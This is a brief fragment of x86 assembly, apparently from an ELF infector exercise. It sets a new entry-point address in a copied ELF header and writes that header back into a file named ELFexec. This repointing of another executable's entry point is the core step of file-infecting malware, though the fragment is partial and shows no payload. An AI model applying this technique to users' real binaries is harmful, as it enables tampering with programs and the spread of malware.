...
_start:	
	...
	mov dword [esi+24], 0x08048294		; 0x8048080 + 214 bytes, 52 bytes to the start of program header and 162 bytes for the memory size of the first program header (162+52=214) 

	;Code to modify the copy of the ELF header of ELFexec
	lseek dword [ebp-4], 0, SEEK_SET	; set to point the start of the ELF file
	mov esi, ebp
	sub esi, 60
	write dword [ebp-4], esi, 52		; write the print of the original ELF file
